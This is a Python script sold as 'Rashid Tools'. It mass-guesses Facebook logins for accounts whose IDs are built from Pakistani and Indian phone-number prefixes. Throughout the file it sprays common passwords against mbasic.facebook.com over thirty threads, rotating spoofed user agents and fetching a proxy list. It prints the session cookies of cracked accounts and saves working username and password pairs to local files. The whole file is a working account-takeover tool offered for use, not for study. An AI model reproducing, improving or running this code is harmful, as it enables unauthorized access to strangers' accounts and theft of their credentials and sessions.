#____________ Create By Rashid Sindhi ______#
#____________MAN MATHAD _____________#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    #_______color system ______#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_________________PROXY________________#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
#_____________Usager agent ____________#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    #_____________LoGo _____________#
logo = ("""

\033[1;32m          (              (        )  (    (      
\033[1;32m          )\ )    (      )\ )  ( /(  )\ ) )\ )   
\033[1;32m         (()/(    )\    (()/(  )\())(()/((()/(   
\033[1;32m          /(_))((((_)(   /(_))((_)\  /(_))/(_))  
\033[1;32m         (_))   )\ _ )\ (_))   _((_)(_)) (_))_   
\033[1;32m         | _ \  (_)_\(_)/ __| | || ||_ _| |   \  
\033[1;32m         |   /   / _ \  \__ \ | __ | | |  | |) | 
 \033[1;32m        |_|_\  /_/ \_\ |___/ |_||_||___| |___/  
                                        
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO RASHID TOOLS               \033[;0m\033[1;91m\033[1;92m

        \033[1;92m═══════════════════════════════════
R        \033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
A        \033[1;32m[-] AUTHOR    :\033[1;32m RASHID HOSSEIN 
S        \033[1;32m[-] GITHUB    :\033[1;32m RASHID2
H        \033[1;32m[-] FACEBOOK  :\033[1;32m M JANi R
I        \033[1;32m[-] WHATSAPP :\033[1;32m+923206691045
D        \033[1;32m[-] RASHID SINDHI HACKER :\033[1;32m
        \033[1;92m═══════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS RASHID BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
#_________________Man__________#
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        #_____________systam country ________#
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;35m[1] FACEBOOK PAKISTAN CLONE    \033[1;91m[WORKING] ")
        print(" \033[1;92m[2] FACEBOOK INDIA    CLOND    \033[1;35m[BEST]")
        print(" \033[1;33m[3] FACEBOOK KHIROHI  CLONE    \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
            #____________Pak,Clone___________#
def v1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 𝐂𝐎𝐃𝐄: 0334, 0315, 0345, 0316, 0340, 0317, 0342 ')
    code = input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐃𝐄 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄: 1000 2000 3000 5000 10000 ')
    limit = int(input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as RASHID:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃: '+tl)
        print("[+] 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄: "+code)
        print('[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃  »»» 𝐕.0.01')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'indian12','Hindustani123','maya123','dev1234','roy1234','india123','raja@123','gopal123 ']
            RASHID.submit(RashidSindhi1,uid,pwx,tl)
    print('==================================================')
    print(' [+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
    print(' [+] OK Ids saved in RASHID/OK.txt')
    print(' [+] CP Ids saved in RASHID/CP.txt')
    print('==================================================')
    #_____________india'clone__________#
def v2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 𝐂𝐎𝐃𝐄: 91639, 91934, 91902, 91701, ')
    code = input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐃𝐄 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄: 1000 2000 3000 5000 10000 ')
    limit = int(input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as RASHID:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃: '+tl)
        print("[+] 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄: "+code)
        print('[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃  »»» ??.0.01')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'indian12','Hindustani123','maya123','dev1234','roy1234','india123','raja@123','gopal123 ']
            RASHID.submit(RashidSindhi1,uid,pwx,tl)
    print('==================================================')
    print(' [+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
    print(' [+] OK Ids saved in RASHID/OK.txt')
    print(' [+] CP Ids saved in RASHID/CP.txt')
    print('==================================================')
    #___________Khirohi,clone________#
def v3():
    user=[]
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 𝐂𝐎𝐃𝐄: 0320, 0322, 0326, 0327, 0320, 0323, ')
    code = input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐃𝐄 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄: 1000 2000 3000 5000 10000 ')
    limit = int(input('[?] 𝐂𝐇𝐎𝐎𝐒𝐄 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as RASHID:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃: '+tl)
        print("[+] 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄: "+code)
        print('[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃  »»» 𝐕.0.01')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'sindhi sindhi','abdulghafar','shar@123','rashidali','deeshikamrat','abdul123','rashid ali','sharasif','sharwaseem','ghulam ali','shanishayan','ali123','ashique@123','obaidul@123','amir123','sindhi123','pakistan123','khankhan1122','khan@123']
            RASHID.submit(RashidSindhi1,uid,pwx,tl)
    print('==================================================')
    print(' [+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
    print(' [+] OK Ids saved in RASHID/OK.txt')
    print(' [+] CP Ids saved in RASHID/CP.txt')
    print('==================================================')
    #________Hyder system ______#
def RashidSindhi1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mRASHID\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=A1eDZk6iFTDqQ3ta5OL5r3rr; sb=A1eDZssFa1V0QJKqTbOR6erz; ps_n=1; ps_l=1; wd=360x678; fr=0FXMHwOsG1c5gyUhs..Bmg1cD..AAA.0.0.BmpynC.AWUoCFyeDH8',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH1819"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[RASHID-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/RASHID/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RASHID-CP❌] {uid}|{ps}")
                open('/sdcard/RASHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RASHID-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
